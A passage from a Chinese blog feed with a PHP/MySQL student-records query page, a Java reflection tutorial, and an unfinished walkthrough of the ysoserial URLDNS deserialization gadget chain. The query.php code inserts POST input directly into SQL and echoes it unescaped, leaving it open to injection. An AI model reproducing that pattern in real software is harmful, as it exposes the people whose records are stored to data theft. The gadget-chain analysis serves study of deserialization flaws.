<h3 id="6-查询功能实现-query-php"><a href="#6-查询功能实现-query-php" class="headerlink" title="6.查询功能实现 query.php"></a>6.查询功能实现 query.php</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html lang=<span class="string">&quot;cn&quot;</span>&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">    &lt;meta charset=<span class="string">&quot;UTF-8&quot;</span>&gt;</span><br><span class="line">    &lt;title&gt;学生党员信息&lt;/title&gt;</span><br><span class="line">    &lt;!-- 加载 Bootstrap 的 CSS 文件 --&gt;</span><br><span class="line">    &lt;link rel=<span class="string">&quot;stylesheet&quot;</span> href=<span class="string">&quot;https://cdn.bootcdn.net/ajax/libs/twitter-bootstrap/4.6.2/css/bootstrap.min.css&quot;</span>&gt;</span><br><span class="line"></span><br><span class="line">    &lt;!-- 加载 jQuery JavaScript 文件 --&gt;</span><br><span class="line">    &lt;script src=<span class="string">&quot;https://cdn.bootcdn.net/ajax/libs/jquery/3.6.0/jquery.min.js&quot;</span>&gt;&lt;/script&gt;</span><br><span class="line"></span><br><span class="line">    &lt;!-- 加载 Popper JavaScript 文件 --&gt;</span><br><span class="line">    &lt;script src=<span class="string">&quot;https://cdn.bootcdn.net/ajax/libs/popper.js/1.16.0/umd/popper.min.js&quot;</span>&gt;&lt;/script&gt;</span><br><span class="line"></span><br><span class="line">    &lt;!-- 加载 Bootstrap 的 JavaScript 文件 --&gt;</span><br><span class="line">    &lt;script src=<span class="string">&quot;https://cdn.bootcdn.net/ajax/libs/twitter-bootstrap/4.6.2/js/bootstrap.min.js&quot;</span>&gt;&lt;/script&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line"></span><br><span class="line">&lt;table <span class="class"><span class="keyword">class</span>=&quot;<span class="title">table</span> <span class="title">table</span>-<span class="title">dark</span>&quot;&gt;</span></span><br><span class="line"><span class="class">    &lt;<span class="title">thead</span>&gt;</span></span><br><span class="line"><span class="class">    &lt;<span class="title">tr</span>&gt;</span></span><br><span class="line"><span class="class">        &lt;<span class="title">th</span> <span class="title">scope</span>=&quot;<span class="title">col</span>&quot;&gt;学号&lt;/<span class="title">th</span>&gt;</span></span><br><span class="line"><span class="class">        &lt;<span class="title">th</span> <span class="title">scope</span>=&quot;<span class="title">col</span>&quot;&gt;姓名&lt;/<span class="title">th</span>&gt;</span></span><br><span class="line"><span class="class">        &lt;<span class="title">th</span> <span class="title">scope</span>=&quot;<span class="title">col</span>&quot;&gt;性别&lt;/<span class="title">th</span>&gt;</span></span><br><span class="line"><span class="class">        &lt;<span class="title">th</span> <span class="title">scope</span>=&quot;<span class="title">col</span>&quot;&gt;班级&lt;/<span class="title">th</span>&gt;</span></span><br><span class="line"><span class="class">        &lt;<span class="title">th</span> <span class="title">scope</span>=&quot;<span class="title">col</span>&quot;&gt;入党时间&lt;/<span class="title">th</span>&gt;</span></span><br><span class="line"><span class="class">    &lt;/<span class="title">tr</span>&gt;</span></span><br><span class="line"><span class="class">    &lt;/<span class="title">thead</span>&gt;</span></span><br><span class="line"><span class="class">    &lt;<span class="title">tbody</span>&gt;</span></span><br><span class="line"><span class="class"></span></span><br><span class="line"><span class="class">    &lt;<span class="title">h2</span>&gt;学生党员信息&lt;/<span class="title">h2</span>&gt;</span></span><br><span class="line"><span class="class">&lt;?<span class="title">php</span></span></span><br><span class="line"><span class="class">$<span class="title">link</span> = <span class="title">include</span> &quot;<span class="title">mysql</span>.<span class="title">php</span>&quot;;</span></span><br><span class="line"><span class="class">$<span class="title">memID</span>=$<span class="title">_POST</span>[&#x27;<span class="title">keyWord</span>&#x27;];</span></span><br><span class="line"><span class="class"></span></span><br><span class="line"><span class="class">$<span class="title">sql</span>=&quot;<span class="title">select</span> * <span class="title">from</span> <span class="title">memberInfo</span> <span class="title">where</span>  <span class="title">mebID</span> = &#x27;$<span class="title">memID</span>&#x27;&quot;;</span></span><br><span class="line"><span class="class">$<span class="title">res</span> = <span class="title">mysqli_query</span>($<span class="title">link</span>, $<span class="title">sql</span>);</span></span><br><span class="line"><span class="class">$<span class="title">row</span>=<span class="title">mysqli_fetch_array</span>($<span class="title">res</span>);</span></span><br><span class="line"><span class="class">?&gt;</span></span><br><span class="line"><span class="class">    &lt;<span class="title">tr</span>&gt;</span></span><br><span class="line"><span class="class">        &lt;<span class="title">td</span>&gt;&lt;?= $<span class="title">row</span>[&quot;<span class="title">mebID</span>&quot;]?&gt;&lt;/<span class="title">td</span>&gt;</span></span><br><span class="line"><span class="class">        &lt;<span class="title">td</span>&gt;&lt;?= $<span class="title">row</span>[&quot;<span class="title">mebName</span>&quot;]?&gt;&lt;/<span class="title">td</span>&gt;</span></span><br><span class="line"><span class="class">        &lt;<span class="title">td</span>&gt;&lt;?= $<span class="title">row</span>[&quot;<span class="title">mebSex</span>&quot;]?&gt;&lt;/<span class="title">td</span>&gt;</span></span><br><span class="line"><span class="class">        &lt;<span class="title">td</span>&gt;&lt;?= $<span class="title">row</span>[&quot;<span class="title">mebClass</span>&quot;]?&gt;&lt;/<span class="title">td</span>&gt;</span></span><br><span class="line"><span class="class">        &lt;<span class="title">td</span>&gt;&lt;?= $<span class="title">row</span>[&quot;<span class="title">mebAddDate</span>&quot;]?&gt;&lt;/<span class="title">td</span>&gt;</span></span><br><span class="line"><span class="class">    &lt;<span class="title">tr</span>&gt;</span></span><br><span class="line"><span class="class">&lt;/<span class="title">body</span>&gt;</span></span><br><span class="line"><span class="class">&lt;/<span class="title">html</span>&gt;</span></span><br><span class="line"><span class="class"></span></span><br></pre></td></tr></table></figure>



<h2 id="页面效果"><a href="#页面效果" class="headerlink" title="页面效果"></a>页面效果</h2><p>index.php</p>
<img src="/2023/03/21/php-mysql%E5%AE%9E%E7%8E%B0%E5%A2%9E%E5%88%A0%E6%94%B9%E6%9F%A5%E5%8A%9F%E8%83%BD/image-20230321145008402.png" class="" title="image-20230321145008402">



<p>query.php</p>
<img src="/2023/03/21/php-mysql%E5%AE%9E%E7%8E%B0%E5%A2%9E%E5%88%A0%E6%94%B9%E6%9F%A5%E5%8A%9F%E8%83%BD/image-20230321145038391.png" class="" title="image-20230321145038391">

<p>add.php</p>
<img src="/2023/03/21/php-mysql%E5%AE%9E%E7%8E%B0%E5%A2%9E%E5%88%A0%E6%94%B9%E6%9F%A5%E5%8A%9F%E8%83%BD/image-20230321145132149.png" class="" title="image-20230321145132149">



<p>edit.php</p>
<img src="/2023/03/21/php-mysql%E5%AE%9E%E7%8E%B0%E5%A2%9E%E5%88%A0%E6%94%B9%E6%9F%A5%E5%8A%9F%E8%83%BD/image-20230321145745180.png" class="" title="image-20230321145745180">















]]></content>
      <tags>
        <tag>mysql</tag>
        <tag>php</tag>
      </tags>
  </entry>
  <entry>
    <title>java反射与URLDNS链</title>
    <url>/2023/03/22/java%E5%8F%8D%E5%B0%84%E4%B8%8EURLDNS%E9%93%BE/</url>
    <content><![CDATA[<h1 id="一、什么是反射："><a href="#一、什么是反射：" class="headerlink" title="一、什么是反射："></a>一、什么是反射：</h1><p>（1）Java反射机制的核心是在程序运行时动态加载类并获取类的详细信息，从而操作类或对象的属性和方法。本质是JVM得到class对象之后，再通过class对象进行反编译，从而获取对象的各种信息。</p>
<p>（2）Java属于先编译再运行的语言，程序中对象的类型在编译期就确定下来了，而当程序在运行时可能需要动态加载某些类，这些类因为之前用不到，所以没有被加载到JVM。通过反射，可以在运行时动态地创建对象并调用其属性，不需要提前在编译期知道运行的对象是谁。</p>
<h1 id="二、反射的原理："><a href="#二、反射的原理：" class="headerlink" title="二、反射的原理："></a>二、反射的原理：</h1><p>下图是类的正常加载过程、反射原理与class对象：</p>
<p>Class对象的由来是将.class文件读入内存，并为之创建一个Class对象。</p>
<img src="/2023/03/22/java%E5%8F%8D%E5%B0%84%E4%B8%8EURLDNS%E9%93%BE/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2E3NDUyMzM3MDA=,size_16,color_FFFFFF,t_70.png" class="" title="img">



<p>对于类加载机制与双亲委派模型感兴趣的小伙伴可以阅读这篇文章：<a href="https://blog.csdn.net/a745233700/article/details/90232862">https://blog.csdn.net/a745233700/article/details/90232862</a></p>
<img src="/2023/03/22/java%E5%8F%8D%E5%B0%84%E4%B8%8EURLDNS%E9%93%BE/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM1NzMzNzUx,size_16,color_FFFFFF,t_70.png" class="" title="img">

<p>这三个阶段我们最熟悉的是Runtime运行阶段，对于源码（编译）阶段和Class类对象阶段可能不是很熟悉。</p>
<p>源码（编译）阶段：这个阶段通常是把一个类的.java文件编译成.class字节码文件的过程（默认一个类对应一个.java源文件）。</p>
<p>Class类对象阶段：这个阶段是将一个类的.class字节码文件加载到内存并创建一个与之对应的Class对象（这个过程也称为反射），jvm的类加载器ClassLoader把.class字节码文件加载进内存后，会把.class字节码文件中的成员属性，构造，成员方法抽取出来封装成一个Class对象，成员属性封装成Field[]数组来表示，构造函数封装成Construction[]来表示，成员方法封装成Method[]数组来表示，但实际上Class类内部封装了很多东西，这里我们只关注这三个。</p>
<p>RunTime运行时阶段：在程序运行阶段，例如使用常规操作new创建Student类的实例对象时，jvm会使用类加载器把.class文件加载到内存中并为之生成一个Class对象，然后这个Class对象与stu1对象有一个映射关系，也就是说，在RunTime运行时阶段只要访问了Person类的内容就会触发Class类对象阶段。</p>
<p>解释一下Class类对象阶段中的Class对象：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">当jvm加载类时会在堆内存中产生一个Class类型的对象（一个类只有一个Class对象，并且Class对象的类型为Class，注意：是Class类，不是class关键字），这个对象包含了类内部的完整结构信息（成员属性，构造，成员方法），通过这个Class对象可以得到类内部结构信息，换句话说，类对象就像是一面镜子一样，透过这个镜子看到类的结构，因此称为反射。</span><br></pre></td></tr></table></figure>



<h1 id="三、反射的优缺点："><a href="#三、反射的优缺点：" class="headerlink" title="三、反射的优缺点："></a>三、反射的优缺点：</h1><p>1、优点：在运行时获得类的各种内容，进行反编译，对于Java这种先编译再运行的语言，能够让我们很方便的创建灵活的代码，这些代码可以在运行时装配，无需在组件之间进行源代码的链接，更加容易实现面向对象。</p>
<p>2、缺点：（1）反射会消耗一定的系统资源，因此，如果不需要动态地创建一个对象，那么就不需要用反射；</p>
<p>（2）反射调用方法时可以忽略权限检查，因此可能会破坏封装性而导致安全问题。</p>
<h1 id="四、反射的用途："><a href="#四、反射的用途：" class="headerlink" title="四、反射的用途："></a>四、反射的用途：</h1><p>1、反编译：.class–&gt;.java</p>
<p>2、通过反射机制访问java对象的属性，方法，构造方法等</p>
<p>3、当我们在使用IDE,比如Ecplise时，当我们输入一个对象或者类，并想调用他的属性和方法是，一按点号，编译器就会自动列出他的属性或者方法，这里就是用到反射。</p>
<p>4、反射最重要的用途就是开发各种通用框架。比如很多框架（Spring）都是配置化的（比如通过XML文件配置Bean），为了保证框架的通用性，他们可能需要根据配置文件加载不同的类或者对象，调用不同的方法，这个时候就必须使用到反射了，运行时动态加载需要的加载的对象。</p>
<p>5、例如，在使用Strut2框架的开发过程中，我们一般会在struts.xml里去配置Action，比如</p>
<action name="login" class="org.ScZyhSoft.test.action.SimpleLoginAction" method="execute">   
    <result>/shop/shop-index.jsp</result>           
    <result name="error">login.jsp</result>       
</action>
比如我们请求login.action时，那么StrutsPrepareAndExecuteFilter就会去解析struts.xml文件，从action中查找出name为login的Action，并根据class属性创建SimpleLoginAction实例，并用Invoke方法来调用execute方法，这个过程离不开反射。配置文件与Action建立了一种映射关系，当View层发出请求时，请求会被StrutsPrepareAndExecuteFilter拦截，然后StrutsPrepareAndExecuteFilter会去动态地创建Action实例。

<p>比如，加载数据库驱动的，用到的也是反射。</p>
<p>Class.forName(“com.mysql.jdbc.Driver”); &#x2F;&#x2F; 动态加载mysql驱动</p>
<h1 id="五、反射机制常用的类："><a href="#五、反射机制常用的类：" class="headerlink" title="五、反射机制常用的类："></a>五、反射机制常用的类：</h1><p>Java.lang.Class;</p>
<p>Java.lang.reflect.Constructor;</p>
<p>Java.lang.reflect.Field;</p>
<p>Java.lang.reflect.Method;</p>
<p>Java.lang.reflect.Modifier;</p>
<h1 id="六、反射的基本使用："><a href="#六、反射的基本使用：" class="headerlink" title="六、反射的基本使用："></a>六、反射的基本使用：</h1><blockquote>
<p>1、获得Class：主要有三种方法：</p>
<p>（1）Object–&gt;getClass</p>
<p>（2）任何数据类型（包括基本的数据类型）都有一个“静态”的class属性</p>
<p>（3）通过class类的静态方法：forName(String className)（最常用）</p>
</blockquote>
<h2 id="Java-lang-reflect-Constructor"><a href="#Java-lang-reflect-Constructor" class="headerlink" title="Java.lang.reflect.Constructor;"></a>Java.lang.reflect.Constructor;</h2><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">getConstructor(<span class="string">&quot;构造方法的类别&quot;</span>....)</span><br><span class="line">newInstance(<span class="string">&quot;可以加上自己构造的class&quot;</span>....)</span><br><span class="line"><span class="comment">//获取String的Class对象</span></span><br><span class="line">Class&lt;?&gt; str = String.class;</span><br><span class="line"><span class="comment">//通过Class对象获取指定的Constructor构造器对象</span></span><br><span class="line">Constructor constructor=c.getConstructor(String.class);</span><br><span class="line"><span class="comment">//根据构造器创建实例：</span></span><br><span class="line"><span class="type">Object</span> <span class="variable">obj</span> <span class="operator">=</span> constructor.newInstance(“hello reflection”);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="type">Object</span> <span class="variable">obj</span> <span class="operator">=</span> cls.getConstructor().newInstance(); <span class="comment">//User obj =new User();</span></span><br></pre></td></tr></table></figure>





<h2 id="Java-lang-reflect-Field"><a href="#Java-lang-reflect-Field" class="headerlink" title="Java.lang.reflect.Field"></a>Java.lang.reflect.Field</h2><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">Class</span> <span class="variable">cls</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;com.User&quot;</span>);</span><br><span class="line"><span class="type">Field</span> <span class="variable">fb</span> <span class="operator">=</span> cls.getField(<span class="string">&quot;参数名&quot;</span>) 获取公有字段并调用</span><br><span class="line"><span class="type">Field</span> <span class="variable">f</span> <span class="operator">=</span>cls.getDeclaredField(<span class="string">&quot;参数名&quot;</span>)获取私有字段</span><br><span class="line">f.setAccessible(<span class="literal">true</span>);<span class="comment">//暴力反射，解除私有限定</span></span><br><span class="line">f.set(obj,<span class="string">&quot;参数值&quot;</span>)；</span><br></pre></td></tr></table></figure>

<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"></span><br></pre></td></tr></table></figure>

<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">filed</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">Class</span> <span class="variable">cls</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;com.User&quot;</span>);</span><br><span class="line"></span><br><span class="line">        System.out.println(<span class="string">&quot;************获取所有公有的字段********************&quot;</span>);</span><br><span class="line">        Field[] fieldArray = cls.getFields();</span><br><span class="line">        <span class="keyword">for</span>(Field f : fieldArray)&#123;</span><br><span class="line">            System.out.println(f);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="type">Field</span> <span class="variable">fb</span> <span class="operator">=</span> cls.getField(<span class="string">&quot;age&quot;</span>); <span class="comment">//获取公有字段**并调用</span></span><br><span class="line">        <span class="comment">//获取一个对象</span></span><br><span class="line">        <span class="type">Object</span> <span class="variable">obj</span> <span class="operator">=</span> cls.getConstructor().newInstance(); <span class="comment">//User obj =new User();</span></span><br><span class="line">        User U=(User)obj;</span><br><span class="line">        fb.set(obj,<span class="number">100</span>);</span><br><span class="line">        System.out.println(U.age);<span class="comment">//public</span></span><br><span class="line"></span><br><span class="line">        <span class="type">Field</span> <span class="variable">f</span> <span class="operator">=</span>cls.getDeclaredField(<span class="string">&quot;name&quot;</span>);  <span class="comment">//获取私有字段**并调用</span></span><br><span class="line">        f.setAccessible(<span class="literal">true</span>);<span class="comment">//暴力反射，解除私有限定</span></span><br><span class="line">        <span class="comment">//为字段设置值</span></span><br><span class="line">        f.set(obj,<span class="string">&quot;aaa&quot;</span>);</span><br><span class="line">        System.out.println(U.getName());</span><br><span class="line"></span><br><span class="line">        f = cls.getDeclaredField(<span class="string">&quot;phoneNum&quot;</span>);</span><br><span class="line">        f.setAccessible(<span class="literal">true</span>);<span class="comment">//暴力反射，解除私有限定</span></span><br><span class="line">        f.set(obj, <span class="string">&quot;18888889999&quot;</span>);</span><br><span class="line">        System.out.println(<span class="string">&quot;验证电话：&quot;</span> + U);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h2 id="Java-lang-reflect-Method"><a href="#Java-lang-reflect-Method" class="headerlink" title="Java.lang.reflect.Method;"></a>Java.lang.reflect.Method;</h2><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"><span class="type">Method</span> <span class="variable">m</span> <span class="operator">=</span>getMethod(<span class="string">&quot;方法名&quot;</span>,方法的参数类型) 返回一个Method对象</span><br><span class="line">如果是私有方法使用getDeclaredMethod</span><br><span class="line"><span class="title function_">invoke</span><span class="params">(obj，<span class="string">&quot;args1&quot;</span>,<span class="string">&quot;args2&quot;</span>...)</span> 并且可以有返回值</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Methods</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">Class</span> <span class="variable">cls</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;com.User&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//获取所有的方法，包括私有的</span></span><br><span class="line">       Method[] methodArray = cls.getDeclaredMethods();</span><br><span class="line">       <span class="keyword">for</span>(Method m : methodArray)&#123;</span><br><span class="line">            System.out.println(m);</span><br><span class="line"></span><br><span class="line">       &#125;</span><br><span class="line">        <span class="type">Method</span> <span class="variable">m</span> <span class="operator">=</span> cls.getMethod(<span class="string">&quot;show1&quot;</span>, String.class);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//实例化一个Student对象</span></span><br><span class="line">        <span class="type">Object</span> <span class="variable">obj</span> <span class="operator">=</span> cls.getConstructor().newInstance();</span><br><span class="line">        m.invoke(obj, <span class="string">&quot;刘德华&quot;</span>);</span><br><span class="line"></span><br><span class="line">        </span><br><span class="line">        m = cls.getDeclaredMethod(<span class="string">&quot;show4&quot;</span>, <span class="type">int</span>.class);<span class="comment">//获取私有的方法</span></span><br><span class="line"></span><br><span class="line">        m.setAccessible(<span class="literal">true</span>);<span class="comment">//解除私有限定</span></span><br><span class="line">        <span class="type">Object</span> <span class="variable">result</span> <span class="operator">=</span> m.invoke(obj, <span class="number">20</span>);<span class="comment">//需要两个参数，一个是要调用的对象（获取有反射），一个是实参</span></span><br><span class="line">        System.out.println(<span class="string">&quot;返回值：&quot;</span> + result);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    &#125;&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h2 id="反射main方法："><a href="#反射main方法：" class="headerlink" title="反射main方法："></a>反射main方法：</h2><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> fanshe.main;</span><br><span class="line"> </span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Student</span> &#123;</span><br><span class="line">	<span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">		System.out.println(<span class="string">&quot;main方法执行了。。。&quot;</span>);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>





<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> fanshe.main;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Method;</span><br><span class="line"> </span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 获取Student类的main方法、不要与当前的main方法搞混了</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Main</span> &#123;</span><br><span class="line">	</span><br><span class="line">	<span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">		<span class="keyword">try</span> &#123;</span><br><span class="line">			<span class="comment">//1、获取Student对象的字节码</span></span><br><span class="line">			<span class="type">Class</span> <span class="variable">clazz</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;fanshe.main.Student&quot;</span>);</span><br><span class="line">			</span><br><span class="line">			<span class="comment">//2、获取main方法</span></span><br><span class="line">			 <span class="type">Method</span> <span class="variable">methodMain</span> <span class="operator">=</span> clazz.getMethod(<span class="string">&quot;main&quot;</span>, String[].class);<span class="comment">//第一个参数：方法名称，第二个参数：方法形参的类型，</span></span><br><span class="line">			<span class="comment">//3、调用main方法</span></span><br><span class="line">			<span class="comment">// methodMain.invoke(null, new String[]&#123;&quot;a&quot;,&quot;b&quot;,&quot;c&quot;&#125;);</span></span><br><span class="line">			 <span class="comment">//第一个参数，对象类型，因为方法是static静态的，所以为null可以，第二个参数是String数组，这里要注意在jdk1.4时是数组，jdk1.5之后是可变参数</span></span><br><span class="line">			 <span class="comment">//这里拆的时候将  new String[]&#123;&quot;a&quot;,&quot;b&quot;,&quot;c&quot;&#125; 拆成3个对象。。。所以需要将它强转。</span></span><br><span class="line">			 methodMain.invoke(<span class="literal">null</span>, (Object)<span class="keyword">new</span> <span class="title class_">String</span>[]&#123;<span class="string">&quot;a&quot;</span>,<span class="string">&quot;b&quot;</span>,<span class="string">&quot;c&quot;</span>&#125;);<span class="comment">//方式一</span></span><br><span class="line">			<span class="comment">// methodMain.invoke(null, new Object[]&#123;new String[]&#123;&quot;a&quot;,&quot;b&quot;,&quot;c&quot;&#125;&#125;);//方式二			</span></span><br><span class="line">		&#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">			e.printStackTrace();</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<h2 id="利用反射创建数值"><a href="#利用反射创建数值" class="headerlink" title="利用反射创建数值"></a>利用反射创建数值</h2><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">testArray</span><span class="params">()</span> <span class="keyword">throws</span> ClassNotFoundException &#123;</span><br><span class="line">        Class&lt;?&gt; cls = Class.forName(<span class="string">&quot;java.lang.String&quot;</span>);</span><br><span class="line">        <span class="type">Object</span> <span class="variable">array</span> <span class="operator">=</span> Array.newInstance(cls,<span class="number">25</span>);</span><br><span class="line">        <span class="comment">//往数组里添加内容</span></span><br><span class="line">        Array.set(array,<span class="number">0</span>,<span class="string">&quot;golang&quot;</span>);</span><br><span class="line">        Array.set(array,<span class="number">1</span>,<span class="string">&quot;Java&quot;</span>);</span><br><span class="line">        Array.set(array,<span class="number">2</span>,<span class="string">&quot;pytho&quot;</span>);</span><br><span class="line">        Array.set(array,<span class="number">3</span>,<span class="string">&quot;Scala&quot;</span>);</span><br><span class="line">        Array.set(array,<span class="number">4</span>,<span class="string">&quot;Clojure&quot;</span>);</span><br><span class="line">        <span class="comment">//获取某一项的内容</span></span><br><span class="line">        System.out.println(Array.get(array,<span class="number">3</span>));</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>



<h2 id="反射修改被final关键字修饰的成员变量"><a href="#反射修改被final关键字修饰的成员变量" class="headerlink" title="反射修改被final关键字修饰的成员变量"></a>反射修改被<code>final</code>关键字修饰的成员变量</h2><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 反射获取Field类的modifiers</span></span><br><span class="line"><span class="type">Field</span> <span class="variable">modifiers</span> <span class="operator">=</span> field.getClass().getDeclaredField(<span class="string">&quot;modifiers&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 设置modifiers修改权限</span></span><br><span class="line">modifiers.setAccessible(<span class="literal">true</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 修改成员变量的Field对象的modifiers值</span></span><br><span class="line">modifiers.setInt(field, field.getModifiers() &amp; ~Modifier.FINAL);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 修改成员变量值</span></span><br><span class="line">field.set(类实例对象, 修改后的值);</span><br></pre></td></tr></table></figure>

<p>因此我们这里给一个具体实例</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">Class</span> <span class="variable">aClass</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;bcell.Test&quot;</span>);</span><br><span class="line"><span class="type">Test</span> <span class="variable">Test</span> <span class="operator">=</span> (Test) aClass.newInstance();</span><br><span class="line"><span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> aClass.getDeclaredField(<span class="string">&quot;TEST&quot;</span>);</span><br><span class="line"><span class="type">Field</span> <span class="variable">modifiers</span> <span class="operator">=</span> field.getClass().getDeclaredField(<span class="string">&quot;modifiers&quot;</span>);</span><br><span class="line">modifiers.setAccessible(<span class="literal">true</span>);</span><br><span class="line">modifiers.setInt(field,field.getModifiers()&amp;~Modifier.FINAL);<span class="comment">//fianl标志位置0</span></span><br><span class="line">field.set(Test,<span class="string">&quot;wocao&quot;</span>);</span><br><span class="line">System.out.println(field.get(Test));</span><br></pre></td></tr></table></figure>

<h2 id="其他"><a href="#其他" class="headerlink" title="其他"></a>其他</h2><p>但是虽然这么多，其中较为重要的⽅法：</p>
<p>获取类的⽅法： forName</p>
<p>实例化类对象的⽅法： newInstance</p>
<p>获取函数的⽅法： getMethod</p>
<p>执⾏函数的⽅法： invoke</p>
<h1 id="URLDNS链"><a href="#URLDNS链" class="headerlink" title="URLDNS链"></a>URLDNS链</h1><p><code>URLDNS</code>是<code>ysoserial</code>中的一条利用链，通常用于检测是否存在<code>Java</code>反序列化漏洞</p>
<p>[1] URLDNS 利用链只能发起 DNS 请求，并不能进行其它利用</p>
<p>[2] 不限制 jdk 版本，使用 Java 内置类，对第三方依赖没有要求 </p>
<p>[3] 目标无回显，可以通过 DNS 请求来验证是否存在反序列化漏洞</p>
<h1 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h1><blockquote>
<p><code>java.util.HashMap</code>实现了<code>Serializable</code>接口，重写了<code>readObject</code>, 在反序列化时会调用<code>hash</code>函数计算<code>key</code>的<code>hashCode</code>，而<code>java.net.URL</code>的<code>hashCode</code>在计算时会调用<code>getHostAddress</code>来解析域名, 从而发出<code>DNS</code>请求</p>
</blockquote>
<h1 id="分析过程"><a href="#分析过程" class="headerlink" title="分析过程"></a>分析过程</h1><blockquote>
<p>这里跟着<code>ysoserial</code>项目中<code>URLDNS</code>的<code>Gadget</code>来分析</p>
</blockquote>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">Gadget Chain:</span><br><span class="line">    HashMap.readObject()</span><br><span class="line">    HashMap.putVal()</span><br><span class="line">    HashMap.hash()</span><br><span class="line">    URL.hashCode()</span><br></pre></td></tr></table></figure>







<h2 id="0x01-HashMap-readObject"><a href="#0x01-HashMap-readObject" class="headerlink" title="0x01  HashMap.readObject()"></a>0x01  HashMap.readObject()</h2><p>首先 HashMap.readObject()可以被反序列化</p>
<img src="/2023/03/22/java%E5%8F%8D%E5%B0%84%E4%B8%8EURLDNS%E9%93%BE/image-20230322202903247.png" class="" title="image-20230322202903247">

<h2 id="0x02putval"><a href="#0x02putval" class="headerlink" title="0x02putval()"></a>0x02putval()</h2><p>查看readObject，这里通过<code>for</code>循环来将<code>HashMap</code>中存储的<code>key</code>通过<code>K key = (K) s.readObject();</code>来进行反序列化，在这之后调用<code>putVal()</code>和<code>hash()</code>函数</p>
<img src="/2023/03/22/java%E5%8F%8D%E5%B0%84%E4%B8%8EURLDNS%E9%93%BE/image-20230322203334018.png" class="" title="image-20230322203334018">

<h2 id="0x03hash"><a href="#0x03hash" class="headerlink" title="0x03hash()"></a>0x03hash()</h2><p>来到hash()函数,当<code>key!=null</code>时会调用<code>hashCode()</code>函数</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">static</span> <span class="keyword">final</span> <span class="type">int</span> <span class="title function_">hash</span><span class="params">(Object key)</span> &#123;</span><br><span class="line">      <span class="type">int</span> h;</span><br><span class="line">      <span class="keyword">return</span> (key == <span class="literal">null</span>) ? <span class="number">0</span> : (h = key.hashCode()) ^ (h &gt;&gt;&gt; <span class="number">16</span>);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

